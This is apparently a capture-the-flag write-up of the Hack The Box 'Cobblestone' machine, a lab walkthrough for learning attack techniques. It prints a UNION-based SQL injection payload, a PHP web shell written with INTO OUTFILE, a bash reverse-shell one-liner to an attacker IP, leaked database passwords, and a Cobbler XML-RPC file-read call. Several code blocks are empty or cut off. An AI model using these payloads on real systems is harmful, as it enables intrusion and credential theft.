```

Add these to `/etc/hosts` file:
```bash
10.129.238.5     cobblestone.htb
```

### Web Enumeration
Check out the website at `http://cobblestone.htb`.

![Cobblestone Website](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_website.png)

Okay, so it is **Minecraft Port Template** website. When *view page source*, we can see there is [bybilly.uk](https://bybilly.uk/) in the source code. <br>
It has a [minecraft-web-portal](https://github.com/bybilly/minecraft-web-portal) repository on GitHub. Also we found 3 subdomains when hover over these sections.

![Subdomains](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_subdomains.png)

![Subdomains](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_subdomains_1.png)

![Subdomains](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_subdomains_2.png)

Let's add these to `/etc/hosts` file:
```bash
10.129.238.5     cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb mc.cobblestone.htb
```

For the `deploy.cobblestone.htb`, it still under development so we can not do anything with this one.

![Deploy Website](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_deploy_website.png)

Moving on to the `vote.cobblestone.htb`.

![Vote Website](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_vote_website.png)

We got a login and register page, it also tell us that **it is still beta and might have issues** so we can leverage this point to exploit this part. <br>
And for this `mc.cobblestone.htb`, it got redirect back to `cobblestone.htb` so nothing useful here.

To make sure we do not miss any endpoints or directories, let's use `fuzz` to enumerate.

```

Found some folder seems interesting like `db`, let's fuzzing out this folder.

```bash

```

We got `connection.php` file but seems like it is empty so let's move on the register and login part.

Gonna register with these information:
```bash
username: 2fa0n
firstname: conan
lastname: shinichi
email: 2fa0n@gmail.com
password: 2fa0n
```

![Register](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_register.png)

![Login](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_login.png)

![Vote](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_vote.png)

After register and login, we are in the **Voting table** page but we can not vote as it was not implemented yet.

![Voting Table](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_voting_table.png)

Check out the `suggest.php` one.

![Suggest](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggest.png)

It seems like we can enter a server for the approval. This maybe chance for SSRF to read or even RCE. <br>
Roll back to the fuzzing part, we got `details.php` &rarr; Let's check it out.

![Details](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_details.png)

We got a pop up *You are not allowed to view this suggestion*. <br>
&rarr; Okay so let's discover this suggestion part via burpsuite.

Back to the **Voting table**, we use the `mc.cobblestone.htb` and check out the burp.

![Burpsuite](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_burpsuite.png)

We are in `http://vote.cobblestone.htb/details.php?id=1` and we know that the `details.php` must go with `id` parameter to get the details of the one to vote. <br>
&rarr; Let's enter `http://vote.cobblestone.htb/index.php` to the suggestion part and see what we got.

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion.png)

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_1.png)

So we got a new `id=4` and from the burpsuite, we got POST request to `suggest.php`. <br>
When we back to the suggest, we can see our new server suggestions.

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_2.png)

Then we trying to exploit the SSRF vulnerability but it seems like it just create a new suggestion so maybe this could be a false positive. <br>
After a while discovering and stucking, we enter `'` and hit enter.

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_3.png)

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_4.png)

Got `500 Internal Server Error`, hmm this could be a good sign for SQLi. That was interesting.

### SQL Injection & RCE & Cracking
So continue to testing out how many columns we got with this payload `99999' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL #` and the result is `500`. Then decrease one column and we got `200`. <br>
&rarr; So we can conclude that this is Blind SQli and got 5 columns. To make it automate, we gonna use `sqlmap` to do this.

First we gonna `Copy to file` the following request in burpsuite and save it as `req`.

```bash
└─$ cat req 
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
Content-Length: 49
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9

Connection: keep-alive

url=http%3A%2F%2Fvote.cobblestone.htb%2Findex.php
```

Then we use `sqlmap` with `--batch` to run it automatically.

```bash
└─$ sqlmap -r req --batch

Somehow we can not dump the `users` table which we can get some credentials to initial access. <br>

We can see there is port `25151` in the `cobbler_api` part. <br>
Gonna discuss this later on.

Now let's create `shell.php` and use `sqlmap` to upload and reverse shell.

```php
<?php system($_GET['cmd']); ?>

<?php system($_REQUEST['cmd']); ?>

Success upload and checking out `whoami`.

![Shell](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_shell.png)

Next up, to reverse shell, we gonna use `base64` to encode the command.

```bash
└─$ echo 'bash -i >& /dev/tcp/10.10.16.36/3333 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi8zMzMzIDA+JjEK
```

Use the `penelope` to catch the reverse shell.

```bash
└─$ penelope -p 3333 
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Then using the `curl` to send the request.

```bash
curl "http://vote.cobblestone.htb/shell.php?cmd=echo%20'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi8zMzMzIDA+JjEK'%20|%20base64%20-d%20|%20bash"
```

But wait for a second and got nothing, seems like not working. <br>
Also for the upload `shell.php` part, we can manually do it via `UNION` query.

```bash
99999' UNION ALL SELECT NULL,NULL,NULL,"<?php system($_GET['cmd']) ?>",NULL INTO OUTFILE '/var/www/vote/shell.php'-- -
```

![Shell](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_shell_2.png)

Just paste the query to the suggestion part and hit enter.

![Shell](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_shell_3.png)

We will also got the same result.

So it looks like the bash command is not working. <br>

There we go! We are in the `www-data` user.

After going around, we found this `connection.php` file.

```bash
www-data@cobblestone:/var/www/vote/db$ cat connection.php 
<?php

$dbserver = "localhost";
$username = "voteuser";
$password = "thaixu6eih0Iicho]irahvoh6aigh>ie";
$dbname = "vote";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
```

Let's check out with `mysql` to see what we can find.

```bash
www-data@cobblestone:/var/www/vote/db$ mysql -h 127.0.0.1 -u voteuser -p'thaixu6eih0Iicho]irahvoh6aigh>ie'                    p'

We can confirm that there is port `25151` is running and this one is quite interesting.

After a while recon, we found out another `connection.php` file.

```bash
www-data@cobblestone:/var/www/html/db$ cat connection.php 
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

Let's check out if we can got some credentials.

```bash

So this one gonna be `sha256` hash but `hashcat` got a lot of mode for this one. <br>
&rarr; We gonna use `hashcat` to crack it without mode to let it identify the hash type that closest to the one we got.

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.

## Initial Access
After initial to `cobble` user, when we typing some command like checking the network status.

```bash
cobble@cobblestone:~$ netstat -tunlp
-rbash: netstat: command not found
```

We got this and take a while to google to found out this blog [How to breakout of rbash restricted bash](https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e).

> For this part, I have not tried it yet to see it works or not so if you can successfully breakout of rbash restricted bash, please let me know. :3

So back to what we got that we found port `25151`, we gonna use ssh portfwarding to forward it to our kali machine.

We got **Error response** with code `501` means that unsupported method (GET) and also got reason is that *Server does not support this operation*. <br>
&rarr; This one only accept the `POST` request, let's try out with it.

Taking a research and found out [Cobbler XMLRPC API](https://github.com/cobbler/cobbler/wiki/XMLRPC-API) and we can know that: <br>
- Linux provisioning server - deploy operating systems.
- PXE boot management - network-based OS installation.
- Configuration management - automated system setup.
- XML-RPC API on port 25151 for remote management.

## Privilege Escalation
### Exploiting Cobbler
Search for vulnerabilities and found out this one [Cobbler Multiple Vulnerabilities](https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/) and also [Cobbler XMLRPC API](https://github.com/cobbler/cobbler/issues/2795). <br>

This script is gonna abuse Cobbler features to copy arbitrary files from server to web accessable location.

> *This script was supported by [2ubZ3r0](https://app.hackthebox.com/users/682632) so big shoutout to him.*

After running the script, we gonna manually XML-RPC call to get the file.

```bash
└─$ curl -X POST http://127.0.0.1:25151 -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>get_template_file_for_system</methodName><params><param><value><string>pwnsys</string></value></param><param><value><string>/leak</string></value></param></params></methodCall>'
<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><string>bf043ee1dff63a36dd8daef225b1f343
</string></value>
</param>
</params>
</methodResponse>
```

There we go, we got the content of the `root.txt` flag.

> *So for this machine, there is also an unintended way to get user and root from xss and then admin session hijacking, so I gonna update this part if got time before the machine patch it.*
